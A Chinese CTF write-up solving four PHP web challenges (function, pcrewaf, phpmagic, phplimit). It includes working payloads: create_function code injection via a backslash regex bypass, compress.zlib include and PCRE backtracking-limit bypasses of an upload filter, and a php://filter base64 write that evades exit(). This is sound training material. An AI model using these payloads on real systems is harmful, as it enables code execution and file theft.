---
layout: post
title: Code-Breaking Puzzles 部分 web wireup
category: writeup
tags: ctf
description:
---

代码审计知识星球二周年 && PWNHUB && Code-Breaking Puzzles



0x00 easy - function
----
环境php7.2.12 apache 2.4.25
```php
<?php
$action = $_GET['action'] ?? '';
$arg = $_GET['arg'] ?? '';

if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
    show_source(__FILE__);
} else {
    $action('', $arg);
}

```
这里可以使用create_function函数，但是在php7.2中以及被废除，本地测试后发现还能使用，于是fuzz出在函数前`\`可以绕过正则。

`
http://51.158.75.42:8087/?action=%5ccreate_function&arg=2;}var_dump(file_get_contents(%22/var/www/flag_h0w2execute_arb1trary_c0de%22));/*
`



0x01 easy - pcrewaf
----
```

所有代码都在URL里。

URL： http://51.158.75.42:8088/

```
这题最开始的代码
```php
<?php
function is_php($data){
    return preg_match('/<\?.*[\(\`].*/is', $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
$data = file_get_contents($_FILES['file']['tmp_name']);
if (is_php($data)) {
    echo "bad request";
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . '/' . random_int(0, 10) . '.php';
    move_uploaded_file($_FILES['file']['tmp_name'], $path);

    header("Location: $path", true, 303);
} 
```
正则部分```
'/<\?.*[\(\`].*/is'
```后面改成了```'/<\?.*[(`;?>].*/is'``` 
未修改正则之前的非预期.
未改前可以使用包含和一些协议流如```zip:\\```、```compress.zlib://```来读取压缩过后去除<?后带有`和(字符达到拿到flag的目的.

![Screen Shot 2018-11-24 at 6.49.59 PM.png][1]

直接上传得到php然后在上传一个include包含就可以了.
```<?php include 'compress.zlib://./4.php';?>```

![Screen Shot 2018-11-24 at 6.52.51 PM.png][2]

然后正确的解法是bypass正则23333
经过一系列的尝试发现'a'*100**2*100+<?php phpinfo();?>+'a'*100**2*100就可以bypass 正则100w+的字符串就可以逃逸匹配.

![Screen Shot 2018-11-24 at 7.06.32 PM.png][3]

然后在上一级目录拿到flag.



0x02 easy - phpmagic
-----

```
<?php
if(isset($_GET['read-source'])) {
    exit(show_source(__FILE__));
}

define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));

if(!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}
chdir(DATA_DIR);

$domain = isset($_POST['domain']) ? $_POST['domain'] : '';
$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');
?>
    <div class="row">
        <div class="col">
            <pre class="mt-3"><?php if(!empty($_POST) && $domain):
                $command = sprintf("dig -t A -q %s", escapeshellarg($domain));
                $output = shell_exec($command);

                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);

                $log_name = $_SERVER['SERVER_NAME'] . $log_name;
                if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) {
                    file_put_contents($log_name, $output);
                }

                echo $output;
            endif; ?>

```
这里就是p师傅很久之前说过的一个绕exit的技巧，```file_put_contents```文件名是可以使用php伪协议对文件内容进行base64解码然后写入文件，这里文件上传时还用到了[php & apache2的黑魔法](http://wonderkun.cc/index.html/?p=626)

然后post提交
`
domain=xxx&log=://filter/convert.base64-decode/resource=/var/www/html/data/md5/aaad.php/.
`
然后在把需要写入的数据base64编码后放在cname里面。

0x03 easy - phplimit
------
这个题在RCTF中出现过,但是这里使用的nginx`getallheaders函数`是`apache_request_headers函数`的别名所以我们需要另外寻找一个可控又不经过`$_GET`处理的函数来实现递归getshell.查阅文档发现了`get_defined_vars`
http://php.net/manual/zh/function.get-defined-vars.php

![Screen Shot 2018-11-24 at 7.17.47 PM.png][4]

然后用将数组的值转化为字符串就行了.
由于open_basedir的原因我们直接列目录读就行.

![Screen Shot 2018-11-24 at 7.20.42 PM.png][5]

![Screen Shot 2018-11-24 at 7.21.30 PM.png][6]

然后在上一级目录拿到flag.

  [1]: https://img.scanfsec.com/img/201811161090521.png
  [2]: https://img.scanfsec.com/img/2018111307899993.png
  [3]: https://img.scanfsec.com/img/201811133673465.png
  [4]: https://img.scanfsec.com/img/2018111499561809.png
  [5]: https://img.scanfsec.com/img/201811267943338.png
  [6]: https://img.scanfsec.com/img/201811568130586.png
